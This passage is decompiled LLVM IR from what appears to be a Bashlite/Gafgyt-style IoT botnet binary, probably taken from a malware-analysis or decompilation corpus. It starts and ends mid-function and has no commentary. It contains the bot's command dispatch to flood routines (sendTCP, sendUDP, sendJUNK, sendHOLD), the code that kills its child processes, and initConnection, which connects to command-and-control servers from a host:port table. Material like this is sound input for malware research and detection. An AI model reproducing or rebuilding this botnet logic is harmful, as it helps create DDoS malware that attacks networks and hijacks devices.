  %v1_1000c4d0 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000c4d4

dec_label_pc_1000c4d4:                            ; preds = %dec_label_pc_1000c49c, %dec_label_pc_1000c4ac
  store i32 ptrtoint (i32* @global_var_1001aa44.922 to i32), i32* @r4, align 4
  store i32 268485860, i32* @lr, align 4
  %v3_1000c4e0 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1001aa44.922 to i32), i32 268566528)
  %v3_1000c4f0 = icmp eq i32 %v3_1000c4e0, 0
  br i1 %v3_1000c4f0, label %dec_label_pc_1000c534, label %dec_label_pc_1000c49c

dec_label_pc_1000c4fc:                            ; preds = %dec_label_pc_1000c458
  store i32 268485888, i32* @lr, align 4
  %v0_1000c4fc = call i32 @listFork()
  %v3_1000c504 = icmp eq i32 %v0_1000c4fc, 0
  br i1 %v3_1000c504, label %dec_label_pc_1000c50c, label %dec_label_pc_1000c690

dec_label_pc_1000c50c:                            ; preds = %dec_label_pc_1000c4fc
  %v7_1000c528 = call i32 @sendTCP(i32 %v2_1000c384, i32 %v2_1000c39c, i32 %v2_1000c3b8, i32 %v2_1000c3d4, i32 %v2_1000c3e8, i32 %storemerge2, i32 %storemerge3)
  %v1_1000c530 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000c534

dec_label_pc_1000c534:                            ; preds = %dec_label_pc_1000c4d4, %dec_label_pc_1000c47c, %dec_label_pc_1000c264, %dec_label_pc_1000c50c
  %v2_1000c538 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1001ab3c.988 to i32), i32* @r4, align 4
  %v3_1000c548 = inttoptr i32 %v2_1000c538 to i8*
  %v4_1000c548 = call i32 @__GI_strcoll(i8* %v3_1000c548, i32 ptrtoint ([5 x i8]* @global_var_1001ab3c.988 to i32))
  %v3_1000c550 = icmp eq i32 %v4_1000c548, 0
  br i1 %v3_1000c550, label %dec_label_pc_1000c558, label %dec_label_pc_1000c664

dec_label_pc_1000c558:                            ; preds = %dec_label_pc_1000c534
  br label %dec_label_pc_1000c5fc

dec_label_pc_1000c56c:                            ; preds = %dec_label_pc_1000c5fc, %dec_label_pc_1000c644
  %v1_1000c570 = mul i32 %storemerge12, 4
  %v3_1000c57c = load i32, i32* @global_var_1002c914.40, align 4
  %v2_1000c580 = add i32 %v3_1000c57c, %v1_1000c570
  %v1_1000c584 = inttoptr i32 %v2_1000c580 to i32*
  %v2_1000c584 = load i32, i32* %v1_1000c584, align 4
  %v3_1000c588 = icmp eq i32 %v2_1000c584, 0
  br i1 %v3_1000c588, label %dec_label_pc_1000c5f0, label %dec_label_pc_1000c590

dec_label_pc_1000c590:                            ; preds = %dec_label_pc_1000c56c
  %v2_1000c5a8 = load i32, i32* %v1_1000c584, align 4
  store i32 268486064, i32* @lr, align 4
  %v0_1000c5ac = call i32 @__libc_getpid()
  %v4_1000c5b4 = icmp eq i32 %v2_1000c5a8, %v0_1000c5ac
  br i1 %v4_1000c5b4, label %dec_label_pc_1000c5f0, label %dec_label_pc_1000c5bc

dec_label_pc_1000c5bc:                            ; preds = %dec_label_pc_1000c590
  %v3_1000c5cc = load i32, i32* @global_var_1002c914.40, align 4
  %v2_1000c5d0 = add i32 %v3_1000c5cc, %v1_1000c570
  %v1_1000c5d4 = inttoptr i32 %v2_1000c5d0 to i32*
  %v2_1000c5d4 = load i32, i32* %v1_1000c5d4, align 4
  store i32 268486116, i32* @lr, align 4
  %v2_1000c5e0 = call i32 @kill(i32 %v2_1000c5d4, i32 9)
  %v1_1000c5e8 = add i32 %stack_var_-244.1, 1
  br label %dec_label_pc_1000c5f0

dec_label_pc_1000c5f0:                            ; preds = %dec_label_pc_1000c590, %dec_label_pc_1000c56c, %dec_label_pc_1000c5bc
  %stack_var_-244.0 = phi i32 [ %stack_var_-244.1, %dec_label_pc_1000c56c ], [ %stack_var_-244.1, %dec_label_pc_1000c590 ], [ %v1_1000c5e8, %dec_label_pc_1000c5bc ]
  %v1_1000c5f4 = add i32 %storemerge12, 1
  br label %dec_label_pc_1000c5fc

dec_label_pc_1000c5fc:                            ; preds = %dec_label_pc_1000c558, %dec_label_pc_1000c5f0
  %stack_var_-244.1 = phi i32 [ 0, %dec_label_pc_1000c558 ], [ %stack_var_-244.0, %dec_label_pc_1000c5f0 ]
  %storemerge12 = phi i32 [ 0, %dec_label_pc_1000c558 ], [ %v1_1000c5f4, %dec_label_pc_1000c5f0 ]
  %v2_1000c624 = load i32, i32* @global_var_1002c8e8.38, align 4
  %v3_1000c63c = icmp eq i32 %v2_1000c624, 0
  br i1 %v3_1000c63c, label %dec_label_pc_1000c644, label %dec_label_pc_1000c56c

dec_label_pc_1000c644:                            ; preds = %dec_label_pc_1000c5fc
  %v3_1000c628 = load i32, i32* @global_var_1002c8ec.39, align 4
  %v3_1000c65c = icmp ugt i32 %v3_1000c628, %storemerge12
  br i1 %v3_1000c65c, label %dec_label_pc_1000c56c, label %dec_label_pc_1000c664

dec_label_pc_1000c664:                            ; preds = %dec_label_pc_1000c644, %dec_label_pc_1000c534
  %v2_1000c668 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([12 x i8]* @global_var_1001ab44.989 to i32), i32* @r4, align 4
  %v3_1000c678 = inttoptr i32 %v2_1000c668 to i8*
  %v4_1000c678 = call i32 @__GI_strcoll(i8* %v3_1000c678, i32 ptrtoint ([12 x i8]* @global_var_1001ab44.989 to i32))
  %v3_1000c680 = icmp eq i32 %v4_1000c678, 0
  br i1 %v3_1000c680, label %dec_label_pc_1000c688, label %dec_label_pc_1000c690

dec_label_pc_1000c688:                            ; preds = %dec_label_pc_1000c664
  %v0_1000c68c = call i32 @__GI_exit()
  br label %dec_label_pc_1000c690

dec_label_pc_1000c690:                            ; preds = %dec_label_pc_1000c358, %dec_label_pc_1000c144, %dec_label_pc_1000bf84, %dec_label_pc_1000be04, %dec_label_pc_1000ba08, %dec_label_pc_1000b7c4, %dec_label_pc_1000b654, %dec_label_pc_1000b74c, %dec_label_pc_1000b8cc, %dec_label_pc_1000bb7c, %dec_label_pc_1000bd04, %dec_label_pc_1000bf0c, %dec_label_pc_1000c0ac, %dec_label_pc_1000c23c, %dec_label_pc_1000c4fc, %dec_label_pc_1000c664, %dec_label_pc_1000b5a8, %dec_label_pc_1000b530, %dec_label_pc_1000c32c, %dec_label_pc_1000c300, %dec_label_pc_1000c2dc, %dec_label_pc_1000c2b8, %dec_label_pc_1000c294, %dec_label_pc_1000c288, %dec_label_pc_1000c124, %dec_label_pc_1000c118, %dec_label_pc_1000bf64, %dec_label_pc_1000bf58, %dec_label_pc_1000bde4, %dec_label_pc_1000bdd8, %dec_label_pc_1000bbd4, %dec_label_pc_1000b9dc, %dec_label_pc_1000b9b4, %dec_label_pc_1000b990, %dec_label_pc_1000b96c, %dec_label_pc_1000b948, %dec_label_pc_1000b924, %dec_label_pc_1000b918, %dec_label_pc_1000b7a4, %dec_label_pc_1000b798, %dec_label_pc_1000b634, %dec_label_pc_1000b628, %dec_label_pc_1000b4bc, %dec_label_pc_1000b558, %dec_label_pc_1000b474, %dec_label_pc_1000b348, %dec_label_pc_1000b304, %dec_label_pc_1000c688
  %v0_1000c6b8 = phi i32 [ %v2_1000c368, %dec_label_pc_1000c358 ], [ %v2_1000c154, %dec_label_pc_1000c144 ], [ %v2_1000bf94, %dec_label_pc_1000bf84 ], [ %v2_1000be14, %dec_label_pc_1000be04 ], [ %v2_1000ba18, %dec_label_pc_1000ba08 ], [ %v2_1000b7d4, %dec_label_pc_1000b7c4 ], [ %v2_1000b664, %dec_label_pc_1000b654 ], [ %v0_1000b74c, %dec_label_pc_1000b74c ], [ %v0_1000b8cc, %dec_label_pc_1000b8cc ], [ %v0_1000bb7c, %dec_label_pc_1000bb7c ], [ %v0_1000bd04, %dec_label_pc_1000bd04 ], [ %v0_1000bf0c, %dec_label_pc_1000bf0c ], [ %v0_1000c0ac, %dec_label_pc_1000c0ac ], [ %v0_1000c23c, %dec_label_pc_1000c23c ], [ %v0_1000c4fc, %dec_label_pc_1000c4fc ], [ %v4_1000c678, %dec_label_pc_1000c664 ], [ 0, %dec_label_pc_1000b5a8 ], [ 0, %dec_label_pc_1000b530 ], [ %v2_1000c33c, %dec_label_pc_1000c32c ], [ %v2_1000c310, %dec_label_pc_1000c300 ], [ -1, %dec_label_pc_1000c2dc ], [ -1, %dec_label_pc_1000c2b8 ], [ -1, %dec_label_pc_1000c294 ], [ 0, %dec_label_pc_1000c288 ], [ %v2_1000c134, %dec_label_pc_1000c124 ], [ 0, %dec_label_pc_1000c118 ], [ %v2_1000bf74, %dec_label_pc_1000bf64 ], [ 0, %dec_label_pc_1000bf58 ], [ %v2_1000bdf4, %dec_label_pc_1000bde4 ], [ 0, %dec_label_pc_1000bdd8 ], [ 0, %dec_label_pc_1000bbd4 ], [ %v2_1000b9ec, %dec_label_pc_1000b9dc ], [ %v2_1000b9c4, %dec_label_pc_1000b9b4 ], [ -1, %dec_label_pc_1000b990 ], [ -1, %dec_label_pc_1000b96c ], [ -1, %dec_label_pc_1000b948 ], [ -1, %dec_label_pc_1000b924 ], [ 0, %dec_label_pc_1000b918 ], [ %v2_1000b7b4, %dec_label_pc_1000b7a4 ], [ 0, %dec_label_pc_1000b798 ], [ %v2_1000b644, %dec_label_pc_1000b634 ], [ 0, %dec_label_pc_1000b628 ], [ 0, %dec_label_pc_1000b4bc ], [ %v0_1000b540, %dec_label_pc_1000b558 ], [ %v4_1000b48c, %dec_label_pc_1000b474 ], [ %v5_1000b380, %dec_label_pc_1000b348 ], [ %v4_1000b31c, %dec_label_pc_1000b304 ], [ %v0_1000c68c, %dec_label_pc_1000c688 ]
  ret i32 %v0_1000c6b8

; uselistorder directives
  uselistorder i32 %storemerge12, { 1, 0, 2 }
  uselistorder i32 %stack_var_-244.1, { 0, 2, 1 }
  uselistorder i32 %v1_1000c570, { 1, 0 }
  uselistorder i32 %v3_1000c4e0, { 1, 0 }
  uselistorder i32 %storemerge2, { 1, 0 }
  uselistorder i32 %storemerge3, { 1, 0 }
  uselistorder i32 %v2_1000c3e8, { 1, 0 }
  uselistorder i32 %v2_1000c3d4, { 1, 0 }
  uselistorder i32 %v2_1000c3b8, { 1, 0 }
  uselistorder i32 %v2_1000c39c, { 1, 0 }
  uselistorder i32 %v2_1000c384, { 1, 0, 3, 2 }
  uselistorder i32 %v3_1000c220, { 1, 0 }
  uselistorder i32 %v2_1000c1a4, { 1, 0 }
  uselistorder i32 %v2_1000c188, { 1, 0 }
  uselistorder i32 %v2_1000c170, { 1, 0, 3, 2 }
  uselistorder i32 %v3_1000c090, { 1, 0 }
  uselistorder i32 %storemerge1840, { 2, 1, 0 }
  uselistorder i32 %v2_1000bfe4, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 %v2_1000bfc8, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 %v2_1000bfb0, { 1, 2, 3, 0, 5, 4 }
  uselistorder i32 %v3_1000bef0, { 1, 0 }
  uselistorder i32 %v2_1000be64, { 1, 0 }
  uselistorder i32 %v2_1000be48, { 1, 0 }
  uselistorder i32 %v2_1000be30, { 1, 0, 3, 2 }
  uselistorder i32* %v1_1000bbe8, { 2, 0, 1, 3 }
  uselistorder i32 %v3_1000bb60, { 1, 0 }
  uselistorder i32 %storemerge9, { 1, 0 }
  uselistorder i32 %v2_1000baa0, { 1, 0 }
  uselistorder i32 %v2_1000ba84, { 1, 0 }
  uselistorder i32 %v2_1000ba68, { 1, 0 }
  uselistorder i32 %v2_1000ba4c, { 1, 0 }
  uselistorder i32 %v2_1000ba34, { 1, 0, 3, 2 }
  uselistorder i32 %v3_1000b8b0, { 1, 0 }
  uselistorder i32 %v2_1000b824, { 1, 0 }
  uselistorder i32 %v2_1000b808, { 1, 0 }
  uselistorder i32 %v2_1000b7f0, { 1, 0, 3, 2 }
  uselistorder i32 %v3_1000b730, { 1, 0 }
  uselistorder i32 %v2_1000b6b4, { 1, 0 }
  uselistorder i32 %v2_1000b698, { 1, 0 }
  uselistorder i32 %v2_1000b680, { 1, 0, 3, 2 }
  uselistorder i32 %tmp, { 4, 5, 6, 7, 8, 3, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 0, 1, 2, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @sendTCP, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @sendSTD, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @sendCNC, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @sendUDP, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @sendJUNK, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @sendHOLD, { 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1001aa44.922 to i32), { 7, 18, 8, 19, 6, 20, 9, 21, 5, 22, 10, 23, 4, 24, 11, 25, 3, 26, 12, 27, 2, 28, 13, 29, 1, 30, 14, 31, 0, 32, 15, 33, 16, 34, 17, 35 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_1001aae4.951 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_10016518.31 to i32), { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000c690, { 47, 15, 14, 0, 18, 19, 20, 21, 22, 23, 13, 1, 24, 25, 12, 2, 26, 27, 11, 3, 28, 29, 10, 30, 9, 4, 31, 32, 33, 34, 35, 36, 37, 8, 5, 38, 39, 7, 6, 40, 41, 16, 43, 17, 42, 44, 45, 46 }
  uselistorder label %dec_label_pc_1000c5fc, { 1, 0 }
  uselistorder label %dec_label_pc_1000c5f0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000c56c, { 1, 0 }
  uselistorder label %dec_label_pc_1000c534, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000c4d4, { 1, 0 }
  uselistorder label %dec_label_pc_1000c49c, { 1, 0 }
  uselistorder label %dec_label_pc_1000c458, { 1, 0 }
  uselistorder label %dec_label_pc_1000c420, { 1, 0 }
  uselistorder label %dec_label_pc_1000c37c, { 1, 0 }
  uselistorder label %dec_label_pc_1000c264, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000c214, { 1, 0 }
  uselistorder label %dec_label_pc_1000c1ec, { 1, 0 }
  uselistorder label %dec_label_pc_1000c0f4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000c084, { 1, 0 }
  uselistorder label %dec_label_pc_1000c02c, { 1, 0 }
  uselistorder label %dec_label_pc_1000bf34, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000bee4, { 1, 0 }
  uselistorder label %dec_label_pc_1000beac, { 1, 0 }
  uselistorder label %dec_label_pc_1000bdb4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000bcdc, { 1, 0 }
  uselistorder label %dec_label_pc_1000bc2c, { 1, 0 }
  uselistorder label %dec_label_pc_1000bbb0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000bb54, { 1, 0 }
  uselistorder label %dec_label_pc_1000bb20, { 1, 0 }
  uselistorder label %dec_label_pc_1000badc, { 1, 0 }
  uselistorder label %dec_label_pc_1000ba2c, { 1, 0 }
  uselistorder label %dec_label_pc_1000b8f4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000b8a4, { 1, 0 }
  uselistorder label %dec_label_pc_1000b86c, { 1, 0 }
  uselistorder label %dec_label_pc_1000b774, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000b724, { 1, 0 }
  uselistorder label %dec_label_pc_1000b6fc, { 1, 0 }
  uselistorder label %dec_label_pc_1000b604, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000b584, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000b508, { 1, 0 }
  uselistorder label %dec_label_pc_1000b444, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000b3e8, { 2, 0, 1 }
}

define i32 @initConnection() local_unnamed_addr {
entry:
  %stack_var_-4132 = alloca i32, align 4
  %v2_1000c6d0 = ptrtoint i32* %stack_var_-4132 to i32
  store i32 268486376, i32* @lr, align 4
  %v3_1000c6e4 = call i32 @__GI_memset(i32 %v2_1000c6d0, i32 0, i32 4096)
  %v3_1000c6ec = load i32, i32* @global_var_1002c8e0.30, align 4
  %v3_1000c6f0 = icmp eq i32 %v3_1000c6ec, 0
  br i1 %v3_1000c6f0, label %dec_label_pc_1000c714, label %dec_label_pc_1000c6f8

dec_label_pc_1000c6f8:                            ; preds = %entry
  store i32 268486408, i32* @lr, align 4
  %v1_1000c704 = call i32 @__libc_close(i32 %v3_1000c6ec)
  store i32 0, i32* @global_var_1002c8e0.30, align 4
  br label %dec_label_pc_1000c714

dec_label_pc_1000c714:                            ; preds = %entry, %dec_label_pc_1000c6f8
  %v3_1000c718 = load i32, i32* @global_var_1002c8a0.990, align 4
  %v3_1000c71c = icmp eq i32 %v3_1000c718, 0
  br i1 %v3_1000c71c, label %dec_label_pc_1000c724, label %dec_label_pc_1000c734

dec_label_pc_1000c724:                            ; preds = %dec_label_pc_1000c714
  br label %dec_label_pc_1000c748

dec_label_pc_1000c734:                            ; preds = %dec_label_pc_1000c714
  %v1_1000c73c = add i32 %v3_1000c718, 1
  br label %dec_label_pc_1000c748

dec_label_pc_1000c748:                            ; preds = %dec_label_pc_1000c724, %dec_label_pc_1000c734
  %storemerge = phi i32 [ 0, %dec_label_pc_1000c724 ], [ %v1_1000c73c, %dec_label_pc_1000c734 ]
  store i32 %storemerge, i32* @global_var_1002c8a0.990, align 4
  %v1_1000c75c = mul i32 %storemerge, 4
  %v2_1000c760 = add i32 %v1_1000c75c, ptrtoint ([15 x i8]** @global_var_1002c890.992 to i32)
  %v1_1000c764 = inttoptr i32 %v2_1000c760 to i32*
  %v2_1000c764 = load i32, i32* %v1_1000c764, align 4
  %v2_1000c770 = inttoptr i32 %v2_1000c764 to i8*
  %v3_1000c770 = call i32 @strcpy(i32 %v2_1000c6d0, i8* %v2_1000c770)
  %v3_1000c778 = load i32, i32* @global_var_1002c894.993, align 4
  store i32 %v2_1000c6d0, i32* @r3, align 4
  store i32 268486544, i32* @lr, align 4
  %v2_1000c78c = call i32 @__GI_strchr(i32 %v2_1000c6d0, i32 58)
  %v3_1000c794 = icmp eq i32 %v2_1000c78c, 0
  br i1 %v3_1000c794, label %dec_label_pc_1000c7e4, label %dec_label_pc_1000c79c

dec_label_pc_1000c79c:                            ; preds = %dec_label_pc_1000c748
  store i32 %v2_1000c6d0, i32* @r3, align 4
  store i32 268486572, i32* @lr, align 4
  %v2_1000c7a8 = call i32 @__GI_strchr(i32 %v2_1000c6d0, i32 58)
  %v1_1000c7b0 = add i32 %v2_1000c7a8, 1
  store i32 268486588, i32* @lr, align 4
  %v2_1000c7b8 = call i32 @atol(i32 %v1_1000c7b0, i32 %v2_1000c7a8)
  store i32 %v2_1000c6d0, i32* @r3, align 4
  store i32 268486612, i32* @lr, align 4
  %v2_1000c7d0 = call i32 @__GI_strchr(i32 %v2_1000c6d0, i32 58)
  %v3_1000c7e0 = inttoptr i32 %v2_1000c7d0 to i8*
  store i8 0, i8* %v3_1000c7e0, align 1
  br label %dec_label_pc_1000c7e4

dec_label_pc_1000c7e4:                            ; preds = %dec_label_pc_1000c748, %dec_label_pc_1000c79c
  %stack_var_-4136.0 = phi i32 [ %v3_1000c778, %dec_label_pc_1000c748 ], [ %v2_1000c7b8, %dec_label_pc_1000c79c ]
  store i32 268486644, i32* @lr, align 4
  %v3_1000c7f0 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_1000c7f0, i32* @global_var_1002c8e0.30, align 4
  store i32 268486688, i32* @lr, align 4
  %v5_1000c81c = call i32 @connectTimeout(i32 %v3_1000c7f0, i32 %v2_1000c6d0, i32 %stack_var_-4136.0, i32 30, i32 %v2_1000c6d0)
  %v3_1000c824 = icmp eq i32 %v5_1000c81c, 0
  %. = zext i1 %v3_1000c824 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v2_1000c6d0, { 1, 0, 3, 2, 5, 4, 7, 6, 8, 9 }
  uselistorder i32 (i32, i32)* @atol, { 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1000c7e4, { 1, 0 }
  uselistorder label %dec_label_pc_1000c748, { 1, 0 }
  uselistorder label %dec_label_pc_1000c714, { 1, 0 }
}

define i32 @getOurIP(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-46 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-4160 = alloca i8, align 1
  %stack_var_-4164 = alloca i32, align 4
  %stack_var_-4180 = alloca i32, align 4
  %stack_var_-4196 = alloca i32, align 4
  store i32 268486788, i32* @lr, align 4
  %v3_1000c880 = call i32 @socket(i32 2, i32 2, i32 0)
  %v4_1000c894 = icmp eq i32 %v3_1000c880, -1
  br i1 %v4_1000c894, label %dec_label_pc_1000c89c, label %dec_label_pc_1000c8a8

dec_label_pc_1000c89c:                            ; preds = %entry
  br label %dec_label_pc_1000cad4

dec_label_pc_1000c8a8:                            ; preds = %entry
  %v2_1000c8a8 = ptrtoint i32* %stack_var_-4196 to i32
  store i32 2, i32* %stack_var_-4196, align 4
  store i32 268486880, i32* @lr, align 4
  %v2_1000c8dc = call i32 @inet_addr(i32 ptrtoint ([8 x i8]* @global_var_1001ab50.994 to i32))
  store i32 53, i32* @r3, align 4
  %v1_1000c8ec = call i32 @htons(i32 53)
  store i32 268486924, i32* @lr, align 4
  %v3_1000c908 = call i32 @__libc_connect(i32 %v3_1000c880, i32 %v2_1000c8a8, i32 16)
  %v4_1000c91c = icmp eq i32 %v3_1000c908, -1
  br i1 %v4_1000c91c, label %dec_label_pc_1000c924, label %dec_label_pc_1000c930

dec_label_pc_1000c924:                            ; preds = %dec_label_pc_1000c8a8
  br label %dec_label_pc_1000cad4

dec_label_pc_1000c930:                            ; preds = %dec_label_pc_1000c8a8
  store i32 16, i32* %stack_var_-4164, align 4
  %v2_1000c938 = ptrtoint i32* %stack_var_-4180 to i32
  %v2_1000c93c = ptrtoint i32* %stack_var_-4164 to i32
  store i32 268486992, i32* @lr, align 4
  %v4_1000c94c = call i32 @__GI_getsockname(i32 %v3_1000c880, i32 %v2_1000c938, i32 %v2_1000c93c, i32 %v2_1000c93c)
  %v4_1000c960 = icmp eq i32 %v4_1000c94c, -1
  br i1 %v4_1000c960, label %dec_label_pc_1000c968, label %dec_label_pc_1000c974

dec_label_pc_1000c968:                            ; preds = %dec_label_pc_1000c930
  br label %dec_label_pc_1000cad4

dec_label_pc_1000c974:                            ; preds = %dec_label_pc_1000c930
  store i32 268487060, i32* @lr, align 4
  %v3_1000c990 = call i32 @__libc_open(i32 ptrtoint ([16 x i8]* @global_var_1001ab58.995 to i32), i32 0)
  %v2_1000ca14 = ptrtoint i8* %stack_var_-4160 to i32
  br label %dec_label_pc_1000ca14

dec_label_pc_1000c9a0:                            ; preds = %dec_label_pc_1000ca14
  store i32 268487092, i32* @lr, align 4
  %v5_1000c9b0 = call i32 @strstr(i32 %v2_1000ca14, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1001ab68.996, i32 0, i32 0), i32 268566528)
  %v3_1000c9b8 = icmp eq i32 %v5_1000c9b0, 0
  br i1 %v3_1000c9b8, label %dec_label_pc_1000c9fc, label %dec_label_pc_1000c9d8.preheader

dec_label_pc_1000c9d8.preheader:                  ; preds = %dec_label_pc_1000c9a0
  %v2_1000c9dc10 = load i8, i8* %stack_var_-4160, align 1
  %v3_1000c9e414 = icmp eq i8 %v2_1000c9dc10, 9
  br i1 %v3_1000c9e414, label %dec_label_pc_1000c9ec, label %dec_label_pc_1000c9cc

dec_label_pc_1000c9cc:                            ; preds = %dec_label_pc_1000c9d8.preheader, %dec_label_pc_1000c9cc
  %v4_1000c9d815 = phi i32 [ %v1_1000c9d0, %dec_label_pc_1000c9cc ], [ %v2_1000ca14, %dec_label_pc_1000c9d8.preheader ]
  %v1_1000c9d0 = add i32 %v4_1000c9d815, 1
  %v5_1000c9d4 = inttoptr i32 %v1_1000c9d0 to i8*
  %v2_1000c9dc = load i8, i8* %v5_1000c9d4, align 1
  %v3_1000c9e4 = icmp eq i8 %v2_1000c9dc, 9
  br i1 %v3_1000c9e4, label %dec_label_pc_1000c9ec, label %dec_label_pc_1000c9cc

dec_label_pc_1000c9ec:                            ; preds = %dec_label_pc_1000c9cc, %dec_label_pc_1000c9d8.preheader
  %storemerge4.lcssa = phi i8* [ %stack_var_-4160, %dec_label_pc_1000c9d8.preheader ], [ %v5_1000c9d4, %dec_label_pc_1000c9cc ]
  store i8 0, i8* %storemerge4.lcssa, align 1
  br label %dec_label_pc_1000ca34

dec_label_pc_1000c9fc:                            ; preds = %dec_label_pc_1000c9a0
  store i32 268487188, i32* @lr, align 4
  %v3_1000ca10 = call i32 @__GI_memset(i32 %v2_1000ca14, i32 0, i32 4096)
  br label %dec_label_pc_1000ca14

dec_label_pc_1000ca14:                            ; preds = %dec_label_pc_1000c974, %dec_label_pc_1000c9fc
  %v3_1000ca24 = call i32 @fdgets(i32 %v2_1000ca14, i32 4096, i32 %v3_1000c990)
  %v3_1000ca2c = icmp eq i32 %v3_1000ca24, 0
  br i1 %v3_1000ca2c, label %dec_label_pc_1000ca34, label %dec_label_pc_1000c9a0

dec_label_pc_1000ca34:                            ; preds = %dec_label_pc_1000ca14, %dec_label_pc_1000c9ec
  store i32 268487228, i32* @lr, align 4
  %v1_1000ca38 = call i32 @__libc_close(i32 %v3_1000c990)
  %v3_1000ca3c = load i8, i8* %stack_var_-4160, align 1
  %v3_1000ca44 = icmp eq i8 %v3_1000ca3c, 0
  br i1 %v3_1000ca44, label %dec_label_pc_1000cac8, label %dec_label_pc_1000ca4c

dec_label_pc_1000ca4c:                            ; preds = %dec_label_pc_1000ca34
  %v2_1000ca4c = ptrtoint i32* %stack_var_-64 to i32
  %v3_1000ca5c = call i32 @strcpy(i32 %v2_1000ca4c, i8* nonnull %stack_var_-4160)
  store i32 ptrtoint (i32* @global_var_1000ca7c.997 to i32), i32* @lr, align 4
  %v3_1000ca78 = call i32 @ioctl(i32 %v3_1000c880, i32 35111, i32 %v2_1000ca4c)
  %v2_1000ca90 = ptrtoint i32* %stack_var_-46 to i32
  br label %dec_label_pc_1000ca88

dec_label_pc_1000ca88:                            ; preds = %dec_label_pc_1000ca4c, %dec_label_pc_1000ca88
  %storemerge58 = phi i32 [ 0, %dec_label_pc_1000ca4c ], [ %v1_1000cab4, %dec_label_pc_1000ca88 ]
  %v2_1000ca98 = add i32 %storemerge58, %v2_1000ca90
  %v1_1000ca9c = inttoptr i32 %v2_1000ca98 to i8*
  %v2_1000ca9c = load i8, i8* %v1_1000ca9c, align 1
  %v4_1000caac = add i32 %storemerge58, ptrtoint (i32* @global_var_1002c8f0.998 to i32)
  %v5_1000caac = inttoptr i32 %v4_1000caac to i8*
  store i8 %v2_1000ca9c, i8* %v5_1000caac, align 1
  %v1_1000cab4 = add nuw nsw i32 %storemerge58, 1
  %tmp37 = icmp slt i32 %v1_1000cab4, 6
  br i1 %tmp37, label %dec_label_pc_1000ca88, label %dec_label_pc_1000cac8

dec_label_pc_1000cac8:                            ; preds = %dec_label_pc_1000ca88, %dec_label_pc_1000ca34
  store i32 ptrtoint (i32* @global_var_1000cad0.999 to i32), i32* @lr, align 4
  %v1_1000cacc = call i32 @__libc_close(i32 %v3_1000c880)
  br label %dec_label_pc_1000cadc

dec_label_pc_1000cad4:                            ; preds = %dec_label_pc_1000c968, %dec_label_pc_1000c924, %dec_label_pc_1000c89c
  br label %dec_label_pc_1000cadc

dec_label_pc_1000cadc:                            ; preds = %dec_label_pc_1000cac8, %dec_label_pc_1000cad4
  %stack_var_-20.0 = phi i32 [ 0, %dec_label_pc_1000cad4 ], [ %tmp, %dec_label_pc_1000cac8 ]
  ret i32 %stack_var_-20.0

; uselistorder directives
  uselistorder i32 %storemerge58, { 2, 1, 0 }
  uselistorder i32 %v1_1000c9d0, { 1, 0 }
  uselistorder i32 %v2_1000ca14, { 3, 1, 0, 2 }
  uselistorder i32 %v3_1000c880, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-4164, { 1, 0 }
  uselistorder i8* %stack_var_-4160, { 2, 4, 0, 1, 3 }
  uselistorder i8 9, { 1, 0, 2 }
  uselistorder i32 (i32)* @htons, { 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 15, 2, 1, 0 }
  uselistorder label %dec_label_pc_1000cadc, { 1, 0 }
  uselistorder label %dec_label_pc_1000ca88, { 1, 0 }
  uselistorder label %dec_label_pc_1000ca14, { 1, 0 }
  uselistorder label %dec_label_pc_1000c9cc, { 1, 0 }
}

define i32 @getBuild() local_unnamed_addr {
entry:
  store i32 268487452, i32* @lr, align 4
  %v4_1000cb18 = call i32 @access(i32 ptrtoint ([16 x i8]* @global_var_1001ab74.1000 to i32), i32 0, i32 268566528)
  %v4_1000cb24 = icmp eq i32 %v4_1000cb18, -1
